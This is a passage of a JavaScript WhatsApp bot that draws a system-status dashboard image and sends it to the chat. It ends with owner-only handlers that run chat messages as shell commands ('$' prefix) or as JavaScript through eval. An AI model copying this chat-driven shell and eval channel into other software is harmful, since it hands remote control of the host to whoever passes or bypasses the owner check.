        function drawIcon(ctx, x, y, type, color) {
            ctx.save();
            ctx.strokeStyle = color;
            ctx.fillStyle = color;
            ctx.lineWidth = 2.5;
            ctx.lineCap = 'round';
            ctx.lineJoin = 'round';
            switch (type) {
                case 'cpu':
                    ctx.strokeRect(x - 12, y - 12, 24, 24);
                    ctx.fillRect(x - 6, y - 6, 12, 12);
                    ctx.beginPath();
                    ctx.moveTo(x - 12, y - 8); ctx.lineTo(x - 16, y - 8);
                    ctx.moveTo(x - 12, y); ctx.lineTo(x - 16, y);
                    ctx.moveTo(x - 12, y + 8); ctx.lineTo(x - 16, y + 8);
                    ctx.moveTo(x + 12, y - 8); ctx.lineTo(x + 16, y - 8);
                    ctx.moveTo(x + 12, y); ctx.lineTo(x + 16, y);
                    ctx.moveTo(x + 12, y + 8); ctx.lineTo(x + 16, y + 8);
                    ctx.stroke();
                    break;
                case 'memory':
                    for (let i = 0; i < 4; i++) { ctx.strokeRect(x - 10 + i * 6, y - 12, 5, 24); }
                    break;
                case 'disk':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x, y, 8, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x, y, 3, 0, Math.PI * 2); ctx.fill();
                    break;
                case 'network':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(x, y - 8); ctx.lineTo(x, y + 8);
                    ctx.moveTo(x - 8, y); ctx.lineTo(x + 8, y); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x - 6, y - 6, 2, 0, Math.PI * 2);
                    ctx.arc(x + 6, y - 6, 2, 0, Math.PI * 2);
                    ctx.arc(x - 6, y + 6, 2, 0, Math.PI * 2);
                    ctx.arc(x + 6, y + 6, 2, 0, Math.PI * 2);
                    ctx.fill();
                    break;
                case 'server':
                    for (let i = 0; i < 3; i++) {
                        ctx.strokeRect(x - 12, y - 10 + i * 8, 24, 6);
                        ctx.beginPath(); ctx.arc(x + 8, y - 7 + i * 8, 1.5, 0, Math.PI * 2); ctx.fill();
                    }
                    break;
                case 'clock':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(x, y); ctx.lineTo(x, y - 8);
                    ctx.moveTo(x, y); ctx.lineTo(x + 6, y); ctx.stroke();
                    break;
            }
            ctx.restore();
        }

        function drawLogo(ctx, x, y, size) {
            ctx.save();
            const gradient = ctx.createLinearGradient(x - size, y - size, x + size, y + size);
            gradient.addColorStop(0, THEME.primary);
            gradient.addColorStop(0.5, THEME.cyan);
            gradient.addColorStop(1, THEME.purple);
            ctx.strokeStyle = gradient;
            ctx.lineWidth = 3;
            ctx.lineCap = 'round';
            ctx.beginPath(); ctx.moveTo(x - size, y); ctx.lineTo(x, y - size); ctx.lineTo(x + size, y); ctx.lineTo(x, y + size); ctx.closePath(); ctx.stroke();
            ctx.beginPath(); ctx.moveTo(x - size / 2, y); ctx.lineTo(x, y - size / 2); ctx.lineTo(x + size / 2, y); ctx.lineTo(x, y + size / 2); ctx.closePath(); ctx.stroke();
            ctx.restore();
        }

        function drawDonutChart(ctx, x, y, radius, lineWidth, percent, color) {
            ctx.save();
            ctx.lineCap = 'round';
            ctx.beginPath(); ctx.arc(x, y, radius, 0, Math.PI * 2);
            ctx.strokeStyle = THEME.bgSecondary; ctx.lineWidth = lineWidth; ctx.stroke();
            const startAngle = -Math.PI / 2;
            const endAngle = startAngle + (Math.PI * 2 * (percent / 100));
            ctx.shadowColor = color; ctx.shadowBlur = 10;
            ctx.beginPath(); ctx.arc(x, y, radius, startAngle, endAngle);
            ctx.strokeStyle = color; ctx.lineWidth = lineWidth; ctx.stroke();
            ctx.shadowBlur = 0;
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 28px Arial";
            ctx.textAlign = "center"; ctx.textBaseline = "middle";
            ctx.fillText(`${Math.round(percent)}%`, x, y);
            ctx.restore();
        }

        function drawProgressBar(ctx, x, y, w, h, percent, color, label, value) {
            ctx.fillStyle = THEME.bgSecondary; ctx.fillRect(x, y, w, h);
            const gradient = ctx.createLinearGradient(x, y, x + w, y);
            gradient.addColorStop(0, color); gradient.addColorStop(1, color + 'aa');
            ctx.fillStyle = gradient; ctx.fillRect(x, y, w * (percent / 100), h);
            ctx.strokeStyle = THEME.border; ctx.lineWidth = 1; ctx.strokeRect(x, y, w, h);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x, y - 6);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 11px Arial"; ctx.textAlign = "right"; ctx.fillText(value, x + w, y - 6);
        }

        function drawStatBox(ctx, x, y, w, h, label, value, color, iconType) {
            drawCard(ctx, x, y, w, h, 12);
            drawIcon(ctx, x + 28, y + 28, iconType, color);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x + 50, y + 22);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 16px Arial"; ctx.fillText(value, x + 50, y + 40);
        }

        async function renderDashboard(stats) {
            const W = 1200;
            const H = 800;
            const canvas = createCanvas(W, H);
            const ctx = canvas.getContext('2d');

            drawBackground(ctx, W, H);
            drawLogo(ctx, 60, 50, 20);

            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 32px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM MONITOR", 100, 58);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "13px Arial"; ctx.fillText("Real-time Performance Dashboard", 100, 80);

            const pingStatus = stats.ping < 100 ? THEME.success : stats.ping < 300 ? THEME.warning : THEME.danger;
            ctx.fillStyle = pingStatus; ctx.font = "bold 28px Arial"; ctx.textAlign = "right"; ctx.fillText(`${stats.ping}ms`, W - 50, 50);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("LATENCY", W - 50, 70);

            const gradient = ctx.createLinearGradient(50, 100, W - 50, 100);
            gradient.addColorStop(0, THEME.primary); gradient.addColorStop(0.33, THEME.success); gradient.addColorStop(0.66, THEME.purple); gradient.addColorStop(1, THEME.cyan);
            ctx.strokeStyle = gradient; ctx.lineWidth = 2; ctx.beginPath(); ctx.moveTo(50, 100); ctx.lineTo(W - 50, 100); ctx.stroke();

            const mainY = 130, cardW = 260, cardH = 240, gap = 30;
            const x1 = 50, x2 = x1 + cardW + gap, x3 = x2 + cardW + gap, x4 = x3 + cardW + gap;

            drawCard(ctx, x1, mainY, cardW, cardH, 15);
            drawIcon(ctx, x1 + 30, mainY + 35, 'cpu', THEME.primary);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("CPU USAGE", x1 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`${stats.cpuCores} Cores @ ${stats.cpuSpeed} MHz`, x1 + 55, mainY + 58);
            drawDonutChart(ctx, x1 + cardW / 2, mainY + 140, 50, 12, stats.cpuLoad, THEME.primary);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(stats.cpuModel.substring(0, 32), x1 + cardW / 2, mainY + 215);

            drawCard(ctx, x2, mainY, cardW, cardH, 15);
            drawIcon(ctx, x2 + 30, mainY + 35, 'memory', THEME.success);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("MEMORY", x2 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.ramTotal)}`, x2 + 55, mainY + 58);
            const ramPercent = (stats.ramUsed / stats.ramTotal) * 100;
            drawDonutChart(ctx, x2 + cardW / 2, mainY + 140, 50, 12, ramPercent, THEME.success);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.ramUsed)} Used`, x2 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.ramTotal - stats.ramUsed)} Free`, x2 + cardW / 2, mainY + 220);

            drawCard(ctx, x3, mainY, cardW, cardH, 15);
            drawIcon(ctx, x3 + 30, mainY + 35, 'disk', THEME.purple);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("STORAGE", x3 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.diskTotal)}`, x3 + 55, mainY + 58);
            let diskPercent = stats.diskTotal > 0 ? (stats.diskUsed / stats.diskTotal) * 100 : 0;
            drawDonutChart(ctx, x3 + cardW / 2, mainY + 140, 50, 12, diskPercent, THEME.purple);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.diskUsed)} Used`, x3 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.diskTotal - stats.diskUsed)} Free`, x3 + cardW / 2, mainY + 220);

            drawCard(ctx, x4, mainY, cardW, cardH, 15);
            drawIcon(ctx, x4 + 30, mainY + 35, 'network', THEME.cyan);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("NETWORK", x4 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Interface: ${stats.networkInterface}`, x4 + 55, mainY + 58);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.textAlign = "left"; ctx.fillText("RX (Download)", x4 + 30, mainY + 95);
            ctx.fillStyle = THEME.cyan; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkRx), x4 + 30, mainY + 120);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText("TX (Upload)", x4 + 30, mainY + 155);
            ctx.fillStyle = THEME.pink; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkTx), x4 + 30, mainY + 180);

            const statsY = 400, statW = 175, statH = 70, statGap = 20;
            drawStatBox(ctx, 50, statsY, statW, statH, "HOSTNAME", stats.hostname.substring(0, 15), THEME.primary, 'server');
            drawStatBox(ctx, 50 + (statW + statGap), statsY, statW, statH, "PLATFORM", `${stats.platform} (${stats.arch})`, THEME.success, 'server');
            drawStatBox(ctx, 50 + (statW + statGap) * 2, statsY, statW, statH, "BOT UPTIME", stats.uptimeBot, THEME.purple, 'clock');
            drawStatBox(ctx, 50 + (statW + statGap) * 3, statsY, statW, statH, "SERVER UPTIME", stats.uptimeServer, THEME.warning, 'clock');
            drawStatBox(ctx, 50 + (statW + statGap) * 4, statsY, statW, statH, "NODE.JS", stats.nodeVersion, THEME.cyan, 'server');

            const perfY = 500, perfH = 250, perfW = W - 100;
            drawCard(ctx, 50, perfY, perfW, perfH, 15);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 20px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM PERFORMANCE", 75, perfY + 35);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("Real-time resource monitoring", 75, perfY + 55);

            const barY = perfY + 85, barW = 500, barH = 18, barGap = 35;
            drawProgressBar(ctx, 75, barY, barW, barH, stats.cpuLoad, THEME.primary, "CPU Load", `${stats.cpuLoad}%`);
            drawProgressBar(ctx, 75, barY + barGap, barW, barH, ramPercent, THEME.success, "Memory Usage", `${Math.round(ramPercent)}%`);
            drawProgressBar(ctx, 75, barY + barGap * 2, barW, barH, diskPercent, THEME.purple, "Disk Usage", `${Math.round(diskPercent)}%`);
            drawProgressBar(ctx, 75, barY + barGap * 3, barW, barH, Math.min(100, (stats.ping / 500) * 100), pingStatus, "Network Latency", `${stats.ping}ms`);

            const infoX = 620, infoStartY = perfY + 85, infoLineHeight = 28;
            let infoY = infoStartY;
            ctx.font = "13px Arial"; ctx.textAlign = "left";
            const drawInfoLine = (label, value) => {
                ctx.fillStyle = THEME.textSecondary; ctx.fillText(label, infoX, infoY);
                ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText(value, infoX + 150, infoY);
                ctx.font = "13px Arial"; infoY += infoLineHeight;
            };
            drawInfoLine("OS Release", stats.release);
            drawInfoLine("CPU Cores", `${stats.cpuCores} Cores`);
            drawInfoLine("CPU Speed", `${stats.cpuSpeed} MHz`);
            drawInfoLine("Total Memory", formatSize(stats.ramTotal));
            drawInfoLine("Free Memory", formatSize(stats.ramTotal - stats.ramUsed));
            ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(`Dashboard Generated: ${new Date().toLocaleString()}`, W / 2, H - 20);
            return canvas.toBuffer('image/png');
        }

        function getNetworkStats() {
            try {
                const interfaces = os.networkInterfaces();
                let totalRx = 0, totalTx = 0, activeInterface = 'N/A', ip = 'N/A';
                for (const [name, addrs] of Object.entries(interfaces)) {
                    if (name.toLowerCase().includes('lo')) continue;
                    for (const addr of addrs) {
                        if (addr.family === 'IPv4' && !addr.internal) { activeInterface = name; ip = addr.address; break; }
                    }
                }
                try {
                    const netstat = execSync("cat /proc/net/dev 2>/dev/null || echo ''").toString();
                    const lines = netstat.split('\n');
                    for (const line of lines) {
                        if (line.includes(':') && !line.includes('lo:')) {
                            const parts = line.trim().split(/\s+/);
                            if (parts.length >= 10) { totalRx += parseInt(parts[1]) || 0; totalTx += parseInt(parts[9]) || 0; }
                        }
                    }
                } catch (e) {}
                return { totalRx, totalTx, activeInterface, ip };
            } catch (e) {
                return { totalRx: 0, totalTx: 0, activeInterface: 'N/A', ip: 'N/A' };
            }
        }

        const start = performance.now();
        await new Promise(resolve => setTimeout(resolve, 10));
        const end = performance.now();
        const latency = (end - start).toFixed(2);

        const cpus = os.cpus();
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const loadAvg = os.loadavg();
        const cpuPercent = Math.min(100, (loadAvg[0] * 100) / cpus.length).toFixed(1);

        let diskTotal = 0, diskUsed = 0;
        try {
            const df = execSync("df -k --output=size,used / 2>/dev/null").toString();
            const lines = df.trim().split("\n");
            if (lines.length > 1) {
                const [total, used] = lines[1].trim().split(/\s+/).map(Number);
                diskTotal = total * 1024;
                diskUsed = used * 1024;
            }
        } catch (e) {}

        const networkStats = getNetworkStats();

        const stats = {
            ping: latency,
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            release: os.release(),
            nodeVersion: process.version,
            uptimeBot: formatTime(process.uptime()),
            uptimeServer: formatTime(os.uptime()),
            cpuModel: cpus[0].model.trim(),
            cpuSpeed: cpus[0].speed,
            cpuCores: cpus.length,
            cpuLoad: cpuPercent,
            ramTotal: totalMem,
            ramUsed: totalMem - freeMem,
            diskTotal: diskTotal,
            diskUsed: diskUsed,
            networkRx: networkStats.totalRx,
            networkTx: networkStats.totalTx,
            networkInterface: networkStats.activeInterface,
            networkIP: networkStats.ip
        };

        const imageBuffer = await renderDashboard(stats);

        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `*SERVER - INFORMATION 🔴*\n\n` +
                `- Latency: ${latency}ms\n` +
                `- CPU: ${stats.cpuLoad}%\n` +
                `- RAM: ${formatSize(stats.ramUsed)} / ${formatSize(stats.ramTotal)}\n` +
                `- Disk: ${formatSize(stats.diskUsed)} / ${formatSize(stats.diskTotal)}\n` +
                `- Network: ↓${formatSize(stats.networkRx)} ↑${formatSize(stats.networkTx)}`
        }, {
            quoted: m
        });

    } catch (e) {
        console.error(e);
        m.reply(`Error: ${e.message}`);
    }
}
break;

//=============================================//
default: {
    if (body.startsWith("$")) { 
        if (!isWaz) return reply(mess.owner)
        exec(body.slice(1).trim(), (err, stdout) => {
            if (err) return m.reply(`${err}`);
            if (stdout) return m.reply(`${stdout}`);
        });
    }

    if (body.startsWith(">")) { 
        if (!isWaz) return reply(mess.owner)
        try {
            let code = body.slice(1).trim();
            let result = await eval(`(async () => { 
                try { return ${code} } catch { return await ${code} } 
            })()`); 
            m.reply(util.format(result));
        } catch (e) {
            m.reply(String(e));
        }
    }

    if (body.startsWith("eval")) { 
        if (!isWaz) return reply(mess.owner)
        try {
            let code = body.slice(4).trim();
            let result = await eval(`(async () => {
                ${code}
            })()`);
            m.reply(util.format(result));
        } catch (e) {
            m.reply(String(e));
        }
     }
   }
 }
} catch (err) {
console.log(err)
await sock.sendMessage(global.owner+"@s.whatsapp.net", {text: err.toString()}, {quoted: m})
}}

//=============================================//
const __filename = fileURLToPath(import.meta.url);
fsSync.watchFile(__filename, () => { 
    fsSync.unwatchFile(__filename); 
    console.log(chalk.white.bold("~> Update File :"), chalk.green.bold(__filename));
    import(`${pathToFileURL(__filename).href}?update=${Date.now()}`);
});